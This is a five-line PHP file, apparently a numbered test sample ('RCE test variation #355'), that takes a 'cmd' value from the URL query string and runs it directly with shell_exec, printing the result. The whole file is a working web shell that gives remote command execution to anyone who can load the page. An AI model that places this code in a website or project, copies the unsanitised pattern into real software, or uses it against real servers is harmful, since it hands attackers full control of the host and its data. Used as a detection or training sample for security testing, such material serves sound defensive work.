<?php
// RCE test variation #355
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>